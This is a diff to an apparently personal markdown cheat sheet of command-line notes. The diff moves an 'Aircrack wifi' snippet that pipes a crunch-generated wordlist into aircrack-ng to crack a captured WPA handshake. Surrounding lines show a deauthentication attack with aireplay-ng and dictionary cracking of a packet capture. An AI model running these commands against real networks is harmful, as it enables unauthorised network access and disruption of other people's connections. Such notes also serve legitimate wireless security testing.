@@ -190,12 +190,6 @@ mixalpha-numeric-all       = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX
 mixalpha-numeric-all-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]
 
 
-**Aircrack wifi**\
-//////-----------------------------------------------------------\
-crunch 8 8 "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz" -t @@@@@@@@ | aircrack-ng handshake.cap -b AA:AA:AA:AA:AA:AA -w - | tee
-
-
-
 **###TBW of an SSD harddrive**\
 //////-------------------------------------------------------------\
 $ fdisk -l\
@@ -325,6 +319,11 @@ check card supports packet injection\
 **##### terminal 1: airodump-ng -c 2 -w packetcapture -d 00:00:00:00:00:00 wlan0\
 **##### terminal 2: aireplay-ng --deauth -a 00:00:00:00:00:00 -c 00:00:00:00:00:00 wlan0\
 **##### terminal 3: aircrack-ng packcapture.pcap -w passwords.txt
+\
+**Aircrack wifi**\
+//////-----------------------------------------------------------\
+crunch 8 8 "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz" -t @@@@@@@@ | aircrack-ng handshake.cap -b AA:AA:AA:AA:AA:AA -w - | tee
+
 
 
 # SNORT RULES AND RUN
